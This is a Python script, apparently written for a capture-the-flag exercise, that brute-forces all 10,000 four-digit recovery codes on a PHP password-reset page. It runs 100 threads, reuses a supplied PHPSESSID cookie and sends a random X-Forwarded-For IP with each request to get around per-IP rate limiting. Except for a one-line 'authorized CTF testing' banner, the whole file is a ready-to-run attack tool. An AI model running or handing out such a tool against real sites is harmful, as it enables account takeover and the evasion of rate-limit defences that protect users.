import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress
import threading

# Initialize the Rich console for fancy output
console = Console()

# Ask user for configuration
TARGET_IP = Prompt.ask("[bold green]Enter the target IP address[/]")
TARGET_PORT = Prompt.ask("[bold green]Enter the target port[/]", default="1337")
SESSION_COOKIE = Prompt.ask("[bold green]Enter your PHPSESSID cookie[/]")

# URL for password reset form
RESET_PASSWORD_URL = f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php"

# Flag to stop all threads when correct code is found
found_flag = threading.Event()
correct_code = None

def get_headers_with_random_ip():
    """Returns headers with a random X-Forwarded-For IP."""
    random_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    return {
        "Host": f"{TARGET_IP}:{TARGET_PORT}",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{TARGET_IP}:{TARGET_PORT}",
        "DNT": "1",
        "Connection": "keep-alive",
        "Referer": f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"PHPSESSID={SESSION_COOKIE}",
        "X-Forwarded-For": random_ip
    }

def try_recovery_code(recovery_code):
    """
    Attempts a single recovery code.
    
    Args:
        recovery_code (str): The recovery code to try.
    
    Returns:
        tuple: (success: bool, recovery_code: str)
    """
    global correct_code
    
    # Check if another thread already found the code
    if found_flag.is_set():
        return (False, recovery_code)
    
    # Prepare headers with random IP
    headers = get_headers_with_random_ip()
    
    # Data payload for the POST request
    data_payload = {
        "recovery_code": recovery_code,
        "s": "180"
    }

    try:
        # Send the POST request
        response = requests.post(
            RESET_PASSWORD_URL,
            headers=headers,
            data=data_payload,
            timeout=5
        )
        
        # Check if the response indicates success
        if "Invalid or expired recovery code!" not in response.text:
            found_flag.set()
            correct_code = recovery_code
            return (True, recovery_code)
        
        return (False, recovery_code)
        
    except requests.RequestException:
        return (False, recovery_code)

def brute_force_recovery_code():
    """Brute-forces the recovery code using multiple threads."""
    global correct_code
    
    console.print(f"[bold blue]Starting brute-force attack...[/]")
    console.print(f"[bold yellow]Target: {RESET_PASSWORD_URL}[/]\n")
    
    # Generate all possible 4-digit codes
    all_codes = [f"{code:04d}" for code in range(10000)]
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Brute-forcing recovery codes...", total=len(all_codes))
            
            # Submit all tasks
            futures = {executor.submit(try_recovery_code, code): code for code in all_codes}
            
            # Process completed futures
            for future in as_completed(futures):
                if found_flag.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    success, code = future.result()
                    
                    if success:
                        console.print(f"\n[bold green]SUCCESS! The correct recovery code is: {code}[/]")
                        break
                    
                except Exception:
                    pass
                
                progress.update(task, advance=1)
    
    if correct_code:
        console.print(f"\n[bold green]═══════════════════════════════════════[/]")
        console.print(f"[bold green]  RECOVERY CODE: {correct_code}[/]")
        console.print(f"[bold green]═══════════════════════════════════════[/]")
    else:
        console.print("\n[bold red]No valid recovery code found in range 0000-9999[/]")

if __name__ == "__main__":
    console.print("""
[bold magenta]╔═══════════════════════════════════════════╗
║  Recovery Code Brute Force Tool          ║
║  For Authorized CTF Testing Only          ║
╚═══════════════════════════════════════════╝[/]
    """)
    brute_force_recovery_code()
